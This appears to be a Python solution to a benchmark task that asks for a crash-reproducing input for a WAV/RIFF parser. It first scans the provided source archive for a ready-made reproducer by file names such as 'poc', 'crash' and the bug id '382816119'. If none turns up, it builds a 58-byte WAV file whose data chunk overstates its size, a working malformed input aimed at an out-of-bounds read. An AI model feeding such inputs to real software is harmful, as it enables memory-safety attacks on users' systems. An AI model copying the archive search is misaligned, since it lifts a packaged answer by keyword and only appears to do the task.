import struct
import tarfile
from typing import Optional


class Solution:
    def _extract_best_riff_candidate(self, src_path: str) -> Optional[bytes]:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                best_data = None
                best_score = -1
                for member in tf.getmembers():
                    if not member.isreg():
                        continue
                    if member.size <= 0 or member.size > 4096:
                        continue

                    name_lower = member.name.lower()
                    try:
                        f = tf.extractfile(member)
                    except Exception:
                        continue
                    if f is None:
                        continue

                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue

                    score = 0
                    if data.startswith(b"RIFF"):
                        score += 10
                    if member.size == 58:
                        score += 5

                    for kw in (
                        "oss-fuzz",
                        "poc",
                        "crash",
                        "fuzz",
                        "testcase",
                        "repro",
                        "bug",
                        "issue",
                        "regress",
                        "382816119",
                    ):
                        if kw in name_lower:
                            score += 3

                    if score > best_score:
                        best_score = score
                        best_data = data

                if best_score >= 10 and best_data is not None:
                    return best_data
        except Exception:
            pass
        return None

    def _build_fallback_poc(self) -> bytes:
        riff_size = 50  # file length (58) - 8
        fmt_size = 16
        audio_fmt = 1
        channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        byte_rate = sample_rate * channels * bits_per_sample // 8
        block_align = channels * bits_per_sample // 8
        data_size_field = 16  # deliberately larger than actual data (14 bytes)
        actual_data = b"\x00" * 14

        header = b"".join(
            [
                b"RIFF",
                struct.pack("<I", riff_size),
                b"WAVE",
                b"fmt ",
                struct.pack("<I", fmt_size),
                struct.pack(
                    "<HHIIHH",
                    audio_fmt,
                    channels,
                    sample_rate,
                    byte_rate,
                    block_align,
                    bits_per_sample,
                ),
                b"data",
                struct.pack("<I", data_size_field),
            ]
        )
        poc = header + actual_data
        assert len(poc) == 58
        return poc

    def solve(self, src_path: str) -> bytes:
        candidate = self._extract_best_riff_candidate(src_path)
        if candidate is not None:
            return candidate
        return self._build_fallback_poc()
